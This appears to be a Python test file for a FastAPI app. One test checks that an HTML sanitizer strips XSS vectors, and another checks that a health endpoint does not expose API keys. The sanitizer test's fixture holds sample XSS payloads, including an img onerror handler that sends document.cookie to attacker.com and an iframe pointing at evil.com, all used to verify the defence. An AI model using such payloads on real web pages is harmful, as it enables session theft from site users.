from app.agents.artifact_skill import sanitize_html
from fastapi.testclient import TestClient
from app.backend.main import app

client = TestClient(app)


def test_html_sanitization_xss_prevention():
    malicious_html = """
    <div>
        <h1>Welcome</h1>
        <script>alert('XSS');</script>
        <img src="x" onerror="document.location='http://attacker.com?c='+document.cookie" />
        <a href="javascript:alert('steal')">Click me</a>
        <iframe src="http://evil.com"></iframe>
    </div>
    """
    sanitized = sanitize_html(malicious_html)

    # Verify all malicious vectors are stripped
    assert "<script" not in sanitized.lower()
    assert "alert('XSS')" not in sanitized
    assert "onerror=" not in sanitized.lower()
    assert "javascript:" not in sanitized.lower()
    assert "<iframe" not in sanitized.lower()
    assert "<h1>Welcome</h1>" in sanitized


def test_api_keys_never_exposed_in_health():
    resp = client.get("/health")
    assert resp.status_code == 200
    text = resp.text
    assert "sk-" not in text
    assert "api_key" not in text.lower() or "not set" in text.lower() or "valid" in text.lower()
